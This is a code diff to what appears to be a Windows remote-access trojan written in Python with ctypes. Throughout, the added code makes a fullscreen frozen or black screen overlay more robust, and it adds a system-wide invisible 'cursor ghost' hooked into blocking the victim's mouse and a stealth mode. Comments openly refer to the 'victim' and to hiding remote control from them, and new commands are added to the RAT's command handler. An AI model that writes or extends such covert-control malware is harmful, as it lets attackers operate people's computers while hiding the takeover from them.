@@ -926,7 +926,7 @@ def _overlay_run(black: bool) -> None:
     WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_void_p,
                                  ctypes.c_uint, ctypes.c_size_t,
                                  ctypes.c_ssize_t)
-    WM_PAINT, WM_DESTROY = 0x0F, 0x02
+    WM_PAINT, WM_DESTROY, WM_CLOSE = 0x0F, 0x02, 0x10
 
     class RECT(ctypes.Structure):
         _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
@@ -975,6 +975,7 @@ def _overlay_run(black: bool) -> None:
     if not w or not h:                    # black mode with no prior capture
         w, h = u32.GetSystemMetrics(0), u32.GetSystemMetrics(1)
         state["w"], state["h"] = w, h
+    gone = [False]     # True once WM_DESTROY ran: window already destroyed
 
     def proc(hwnd, msg, wp, lp):
         if msg == WM_PAINT:
@@ -996,7 +997,11 @@ def _overlay_run(black: bool) -> None:
                                   ctypes.byref(bmi), 0, 0x00CC0020)
             u32.EndPaint(hwnd, ctypes.byref(ps))
             return 0
+        if msg == WM_CLOSE:                 # explicit close: destroy now -
+            u32.DestroyWindow(hwnd)         # WM_DESTROY below ends the pump
+            return 0
         if msg == WM_DESTROY:
+            gone[0] = True                  # window really is going away
             u32.PostQuitMessage(0)
             return 0
         if msg == 0x20:                       # WM_SETCURSOR: force hidden
@@ -1037,10 +1042,18 @@ def _overlay_run(black: bool) -> None:
     u32.ShowWindow(hwnd, 8)               # SW_SHOWNA - never takes focus
     u32.SetWindowPos(hwnd, -1, 0, 0, w, h, 0x0050)   # SWP_NOACTIVATE|SWP_SHOWWINDOW
     m = MSG()
-    while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
-        u32.TranslateMessage(ctypes.byref(m))
-        u32.DispatchMessageW(ctypes.byref(m))
-    state["hwnd"] = None
+    try:
+        while u32.GetMessageW(ctypes.byref(m), None, 0, 0) > 0:
+            u32.TranslateMessage(ctypes.byref(m))
+            u32.DispatchMessageW(ctypes.byref(m))
+    finally:
+        # Exception-safe pump exit: if the pump dies on an error path
+        # (GetMessageW returning -1, a dispatch exception) with the window
+        # still up, destroy it here. A fullscreen window that outlives its
+        # message pump is exactly the "stuck black overlay" bug.
+        if not gone[0] and state["hwnd"]:
+            u32.DestroyWindow(state["hwnd"])
+        state["hwnd"] = None
 
 
 def _overlay_on(black: bool = False) -> str:
@@ -1058,29 +1071,159 @@ def _overlay_on(black: bool = False) -> str:
                          daemon=True, name="overlay")
     _ov_state["thread"] = t
     t.start()
+    _overlay_watch_start()                # safety net for a pump thread that
+    # dies after the state write: the watchdog clears the leftovers
     for _ in range(50):                   # up to ~2.5s for window creation
         if _ov_state["hwnd"]:
             break
         time.sleep(0.05)
     if _ov_state["hwnd"]:
         _ov_state["black"] = black
+        _ghost_ref_add("overlay")    # while a frozen/blank overlay is up,
+        # ghost the victim cursor so remote input never drags it visibly
         kind = "solid black" if black else "screen frozen"
         return "[+] overlay on (%s, click-through: local and remote input reach the desktop)" % kind
     return "[!] overlay failed to create window"
 
 
-def _overlay_off() -> str:
+def _overlay_off(target_hwnd=None) -> str:
+    """Best-effort overlay teardown. WM_CLOSE is sent into the overlay
+    thread's own pump (its proc calls DestroyWindow on the creating
+    thread - legal); a hung/ignoring window gets a cross-thread
+    DestroyWindow only as a last resort. Every step is exception-isolated
+    so one failure can never leave the screen black or the monitor off.
+    target_hwnd guards the watchdog: when the overlay was already
+    replaced by a fresh one, the caller (watchdog) backs off."""
+    import ctypes
+    WM_CLOSE = 0x10
+    _ghost_ref_del("overlay")   # restore the victim cursor FIRST: if any
+    # later step fails, the victim can still see and move the pointer
     hwnd = _ov_state["hwnd"]
     t = _ov_state["thread"]
+    if target_hwnd is not None and hwnd != target_hwnd:
+        return "[i] overlay replaced meanwhile (left running)"
+    # clear the state BEFORE destructive work: a dying pump or a re-entrant
+    # teardown path re-reading the state sees no window and no stale bits
+    _ov_state["hwnd"] = None
+    _ov_state["bits"] = None
     if not hwnd and (not t or not t.is_alive()):
         return "[i] overlay not running"
+    closed = False
     if hwnd:
-        import ctypes
-        ctypes.windll.user32.PostMessageW(hwnd, 0x10, 0, 0)   # WM_CLOSE
-    if t:
-        t.join(timeout=5)
-    _ov_state["bits"] = None
+        try:
+            u32 = ctypes.windll.user32
+            u32.SendMessageTimeoutW.argtypes = (
+                ctypes.c_void_p, ctypes.c_uint, ctypes.c_size_t,
+                ctypes.c_ssize_t, ctypes.c_uint, ctypes.c_uint,
+                ctypes.POINTER(ctypes.c_ssize_t))
+            res = ctypes.c_ssize_t()
+            r = u32.SendMessageTimeoutW(hwnd, WM_CLOSE, 0, 0,
+                                        0x2,      # SMTO_ABORTIFHUNG
+                                        1500, ctypes.byref(res))
+            if r and not u32.IsWindow(hwnd):
+                closed = True       # pump handled WM_CLOSE -> destroyed
+        except Exception:
+            pass                    # never let teardown itself raise
+    if not closed and hwnd:
+        try:
+            if ctypes.windll.user32.IsWindow(hwnd):
+                # thread wedged or ignored WM_CLOSE: cross-thread destroy
+                # beats a permanent fullscreen black window
+                ctypes.windll.user32.DestroyWindow(hwnd)
+        except Exception:
+            pass
+    if t and t.is_alive():
+        try:
+            if threading.current_thread() is not t:
+                t.join(timeout=3)
+        except Exception:
+            pass
+    _overlay_leftovers()
+    try:
+        # full repaint clears dead pixels / stuck black regions
+        ctypes.windll.user32.InvalidateRect(None, None, 1)
+        ctypes.windll.user32.RedrawWindow(None, None, None, 0x1 | 0x100)
+    except Exception:
+        pass
     return "[+] overlay off (screen live again)"
+
+
+def _overlay_leftovers() -> None:
+    """Sweep any orphaned nvo* windows belonging to this process. Keeps the
+    callback reference alive for the duration of EnumWindows."""
+    import ctypes
+    found = []
+    live_hwnd = _ov_state["hwnd"]   # snapshot: never sweep a window the
+    live_t = _ov_state["thread"]    # running state still references
+
+    def cb(hwnd, _lp):
+        try:
+            u32 = ctypes.windll.user32
+            buf = ctypes.create_unicode_buffer(64)
+            n = u32.GetClassNameW(hwnd, buf, 64)
+            if n and buf.value.startswith("nvo"):
+                pid = ctypes.c_ulong()
+                u32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+                if pid.value == os.getpid():
+                    if (hwnd == live_hwnd and live_t
+                            and live_t.is_alive()):
+                        return True      # live overlay, not an orphan
+                    found.append(hwnd)
+        except Exception:
+            pass
+        return True
+
+    try:
+        ENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
+                                      ctypes.c_ssize_t)
+        cb_ref = ENUMPROC(cb)          # alive for the whole EnumWindows call
+        ctypes.windll.user32.EnumWindows(cb_ref, 0)
+    except Exception:
+        return
+    for hwnd in found:
+        try:
+            ctypes.windll.user32.DestroyWindow(hwnd)
+        except Exception:
+            pass
+
+
+# Watchdog: a pump thread that dies after the state write (e.g. an
+# exception inside GetMessageW dispatch between the finally-destroy and the
+# state clear) would leave _ov_state["thread"] referencing a corpse while a
+# half-built window lingers. The lazy 5s tick detects that and runs the
+# guarded teardown, so the screen can never stay frozen/black silently.
+_ov_watch = {"started": False}
+
+
+def _overlay_watch_start() -> None:
+    if _ov_watch["started"]:
+        return
+    _ov_watch["started"] = True
+
+    def tick():
+        while True:
+            try:
+                time.sleep(5)
+                t = _ov_state["thread"]
+                hwnd = _ov_state["hwnd"]
+                if not hwnd and (not t or not t.is_alive()):
+                    continue              # nothing running: idle
+                dead = (not t or not t.is_alive())
+                gone = False
+                if hwnd:
+                    import ctypes
+                    try:
+                        if not ctypes.windll.user32.IsWindow(hwnd):
+                            gone = True
+                    except Exception:
+                        pass
+                if dead or gone:
+                    _overlay_off(hwnd)
+            except Exception:
+                pass                       # watchdog never dies
+
+    threading.Thread(target=tick, daemon=True,
+                     name="ovl-watch").start()
 
 
 def _cb_hookproc(nCode, wParam, lParam):
@@ -1161,15 +1304,21 @@ def _cursor_block(hard: bool = False) -> str:
     WM_MOUSEMOVE (no admin needed). Injected input - netvnc remote
     control via SetCursorPos/mouse_event - carries LLMHF_INJECTED and
     passes through, so remote control stays live while pinned.
-    hard=BlockInput additionally (admin only)."""
+    hard=BlockInput additionally (admin only). While a pin is live the
+    cursor is ghosted: the victim cannot watch it fight the block, and the
+    frozen composite stream never drags a stale pointer around."""
     import ctypes
     u32 = ctypes.windll.user32
     t = _cursor_state["thread"]
-    if t is not None and t.is_alive():
+    live = (t is not None and t.is_alive())
+    if live:
         msg = "[i] cursor already pinned"
     else:
+        live = _cb_hook_start()
         msg = ("[+] cursor pinned (victim moves blocked, remote control live)"
-               if _cb_hook_start() else "[!] cursor hook install failed")
+               if live else "[!] cursor hook install failed")
+    if live:
+        _ghost_ref_add("block")   # ref-counted: released by _cursor_unblock
     if hard:
         if u32.BlockInput(1):
             msg += ", hard BlockInput on"
@@ -1183,7 +1332,166 @@ def _cursor_unblock() -> str:
     u32 = ctypes.windll.user32
     u32.BlockInput(0)
     _cb_hook_stop()
+    _ghost_ref_del("block")   # physical moves live again: pointer returns
     return "[+] cursor released"
+
+
+# ===== CURSOR GHOST (hide the victim's pointer system-wide) =====
+# Every standard system cursor (arrow, beam, hand, busy, size, ...) is
+# replaced by one fully transparent 32x32 cursor. AND mask all 1s + XOR
+# mask all 0s means destination = (source AND 1) XOR 0 = source, so the
+# image passes through untouched and nothing is ever drawn. Ref-counted:
+# overlay / block / manual each hold a tag while they need the pointer
+# hidden, so partial teardown can never leave the victim cursor stuck
+# invisible, and a mid-teardown crash is repaired by atexit.
+import atexit
+
+_ghost_state = {"on": False, "cursors": [], "refs": {}, "atexit": False}
+# OCR_ ids for the arrow, text, wait, cross, up-arrow, hand, pen,
+# unavail, size-NESW, size-NS, size-NWSE, size-EW, size-ALL, appstarting
+_GHOST_OCR_IDS = [32512, 32513, 32514, 32515, 32516, 32642, 32643,
+                  32644, 32645, 32646, 32648, 32649, 32650, 32640]
+
+
+def _ghost_atexit_once() -> None:
+    """Register the safety restore exactly once. On a normal interpreter
+    exit while the pointer is still ghosted, atexit puts the real cursor
+    scheme back (loader_py re-arms the cursor on boot as a second net)."""
+    if _ghost_state["atexit"]:
+        return
+    _ghost_state["atexit"] = True
+    atexit.register(_ghost_force_off)
+
+
+def _ghost_engage() -> bool:
+    """Install the transparent cursor over every OCR id. Returns True when
+    at least one slot was replaced. A slot the system accepted is owned by
+    the system (freed when SPI_SETCURSORS restores the scheme); a slot that
+    failed still belongs to us and is destroyed right here."""
+    if os.name != "nt":
+        return False
+    import ctypes
+    u32 = ctypes.windll.user32
+    u32.GetModuleHandleW.restype = ctypes.c_void_p
+    u32.GetModuleHandleW.argtypes = (ctypes.c_wchar_p,)
+    u32.CreateCursor.restype = ctypes.c_void_p
+    u32.CreateCursor.argtypes = (ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
+                                 ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
+                                 ctypes.c_void_p)
+    u32.SetSystemCursor.restype = ctypes.c_bool
+    u32.SetSystemCursor.argtypes = (ctypes.c_void_p, ctypes.c_uint)
+    u32.DestroyCursor.restype = ctypes.c_bool
+    u32.DestroyCursor.argtypes = (ctypes.c_void_p,)
+    hmod = u32.GetModuleHandleW(None)
+    if not hmod:
+        return False
+    and_bits = ctypes.create_string_buffer(b"\xff" * 128)   # 32*32/8, all 1s
+    xor_bits = ctypes.create_string_buffer(128)              # all 0s
+    and_addr = ctypes.addressof(and_bits)
+    xor_addr = ctypes.addressof(xor_bits)
+    cursors = []
+    replaced = 0
+    for oid in _GHOST_OCR_IDS:
+        try:
+            cur = u32.CreateCursor(hmod, 0, 0, 32, 32, and_addr, xor_addr)
+        except Exception:
+            cur = None
+        if not cur:
+            continue
+        try:
+            ok = bool(u32.SetSystemCursor(cur, oid))
+        except Exception:
+            ok = False
+        if ok:
+            cursors.append(cur)      # system owns it; freed on restore
+            replaced += 1
+        else:
+            try:
+                u32.DestroyCursor(cur)   # still ours: release it
+            except Exception:
+                pass
+    _ghost_state["cursors"] = cursors
+    if replaced:
+        _ghost_state["on"] = True
+        return True
+    return False
+
+
+def _ghost_disengage() -> bool:
+    """Restore the user's saved cursor scheme with SPI_SETCURSORS, which
+    reloads it from the profile and frees every transparent cursor we
+    installed. State is only cleared when the call reports success."""
+    if os.name != "nt":
+        return False
+    import ctypes
+    try:
+        u32 = ctypes.windll.user32
+        u32.SystemParametersInfoW.restype = ctypes.c_bool
+        u32.SystemParametersInfoW.argtypes = (ctypes.c_uint, ctypes.c_uint,
+                                              ctypes.c_void_p, ctypes.c_uint)
+        ok = bool(u32.SystemParametersInfoW(0x0057, 0, None, 0x1 | 0x2))
+    except Exception:
+        ok = False
+    if ok:
+        # the system destroyed the replaced handles: drop our references so
+        # nothing double-frees them later
+        _ghost_state["cursors"] = []
+        _ghost_state["on"] = False
+    return ok
+
+
+def _ghost_ref_add(tag: str) -> bool:
+    """Take a holder reference, engaging the ghost on the first holder.
+    Returns True when the pointer is (or already was) invisible."""
+    refs = _ghost_state["refs"]
+    refs[tag] = refs.get(tag, 0) + 1
+    if not _ghost_state["on"] and not _ghost_engage():
+        refs[tag] = refs.get(tag, 0) - 1
+        if refs[tag] <= 0:
+            refs.pop(tag, None)
+        return False
+    _ghost_atexit_once()
+    return True
+
+
+def _ghost_ref_del(tag: str) -> None:
+    """Drop a holder reference; the real cursor returns when the last
+    holder lets go."""
+    refs = _ghost_state["refs"]
+    if refs.get(tag, 0) > 0:
+        refs[tag] -= 1
+    if refs.get(tag, 0) <= 0:
+        refs.pop(tag, None)
+    if _ghost_state["on"] and not refs:
+        _ghost_disengage()
+
+
+def _ghost_force_off() -> None:
+    """Drop every holder and restore the real cursor unconditionally
+    (atexit + stealth teardown path)."""
+    _ghost_state["refs"] = {}
+    if _ghost_state["on"]:
+        _ghost_disengage()
+
+
+def _ghost_on_cmd() -> str:
+    if os.name != "nt":
+        return "[!] cursor ghost: Windows only"
+    if _ghost_ref_add("manual"):
+        return "[+] cursor ghost on (pointer invisible)"
+    return "[!] cursor ghost: failed to replace cursors"
+
+
+def _ghost_off_cmd() -> str:
+    if os.name != "nt":
+        return "[!] cursor ghost: Windows only"
+    _ghost_ref_del("manual")
+    if _ghost_state["on"]:
+        holders = ", ".join(sorted(_ghost_state["refs"]))
+        if not holders:
+            return "[!] cursor ghost: restore failed (still invisible)"
+        return "[i] cursor ghost still on (held by: %s)" % holders
+    return "[+] cursor restored (real pointer visible)"
 
 
 # ===== STEALTH (blank screen + hold awake, auto-exit on physical input) =====
@@ -1274,16 +1582,25 @@ def _stealth_hooks_start() -> bool:
 
 
 def _stealth_teardown(reason: str) -> str:
+    """Belt-and-braces teardown. Every restore step runs even when the
+    matching state already looks off: a partial _stealth_on failure must
+    never leave the monitor off, the overlay stuck, or the cursor
+    invisible. Each step is exception-isolated so a single failure cannot
+    abort the rest of the restore."""
     import ctypes
     u32 = ctypes.windll.user32
     k32 = ctypes.windll.kernel32
-    if not _stealth_state["on"]:
-        return "[i] stealth not running"
+    was_on = _stealth_state["on"]
     _stealth_state["on"] = False
+    _stealth_state["reason"] = ""
     t = _stealth_state["thread"]
     if t is not None and t.is_alive():
-        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
-        t.join(timeout=5)
+        try:
+            u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
+            if threading.current_thread() is not t:   # never self-join
+                t.join(timeout=5)
+        except Exception:
+            pass
     for hook in _stealth_state["hooks"]:
         try:
             u32.UnhookWindowsHookEx(hook)
@@ -1291,9 +1608,25 @@ def _stealth_teardown(reason: str) -> str:
             pass
     _stealth_state["hooks"] = []
     _stealth_state["thread"] = None
-    k32.SetThreadExecutionState(0x80000000)   # ES_CONTINUOUS: release hold
-    _monitor_on()
-    _overlay_off()
+    _stealth_state["note"] = None
+    _stealth_state["watchdog"] = None
+    try:
+        k32.SetThreadExecutionState(0x80000000)   # ES_CONTINUOUS: release
+    except Exception:
+        pass
+    # belt and braces: screen state is restored even if stealth was never
+    # fully marked on (covers a crash between monitor-off and state write)
+    try:
+        _monitor_on()
+    except Exception:
+        pass
+    try:
+        _overlay_off()
+    except Exception:
+        pass
+    _ghost_force_off()   # drop overlay/block refs wholesale, cursor back
+    if not was_on:
+        return "[i] stealth not running (screen state restored anyway)"
     return "[+] stealth off (%s) - screen live, input released" % reason
 
 
@@ -2233,6 +2566,10 @@ def execute_command(cmd: str) -> bytes:
         return (_cursor_block("hard" in low) + "\n").encode() + MARKER
     if low == "cursor unblock":
         return (_cursor_unblock() + "\n").encode() + MARKER
+    if low in ("cursor ghost on", "ghost cursor on"):
+        return (_ghost_on_cmd() + "\n").encode() + MARKER
+    if low in ("cursor ghost off", "ghost cursor off"):
+        return (_ghost_off_cmd() + "\n").encode() + MARKER
     if low == "stealth on":
         return (_stealth_on("manual") + "\n").encode() + MARKER
     if low == "stealth off":
